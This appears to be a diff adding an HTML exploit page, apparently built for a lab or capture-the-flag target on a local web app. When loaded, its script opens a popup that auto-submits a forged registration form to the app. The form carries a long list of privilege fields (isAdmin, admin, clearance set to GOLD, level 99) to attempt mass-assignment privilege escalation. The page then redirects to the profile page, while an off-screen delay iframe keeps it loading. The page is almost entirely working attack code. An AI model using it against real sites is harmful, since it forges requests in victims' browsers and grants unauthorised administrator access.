@@ -1,0 +1,22 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>load</title></head>
+<body style="margin:0;background:#fff">
+<iframe id="busy" src="https://httpbin.org/delay/9" style="position:absolute;left:-9999px;width:1px;height:1px"></iframe>
+<script>
+var HOST='http://127.0.0.1:3000';
+var REG=HOST+'/register';
+var PROFILE=HOST+'/profile#clearance';
+var u='gld'+Date.now()+Math.floor(Math.random()*9999);
+var p='Pw'+Date.now();
+var extra='';
+var fields=['clearance','rank','role','level','grade','tier','access','clearanceLevel','security','privilege','authority','isAdmin','admin'];
+for(var i=0;i<fields.length;i++){ extra += '<input name="'+fields[i]+'" value="GOLD">'; }
+extra += '<input name="isAdmin" value="true"><input name="admin" value="true"><input name="level" value="99">';
+var FORM='<form id="f" method="POST" action="'+REG+'">'+
+  '<input name="username" value="'+u+'">'+
+  '<input name="password" value="'+p+'">'+extra+
+  '</form><script>document.getElementById("f").submit();<\/scr'+'ipt>';
+try{ var w=window.open('','rg','width=200,height=200'); if(w){ w.document.open(); w.document.write(FORM); w.document.close(); } }catch(e){}
+setTimeout(function(){ window.location.href=PROFILE; },2600);
+</script>
+</body></html>
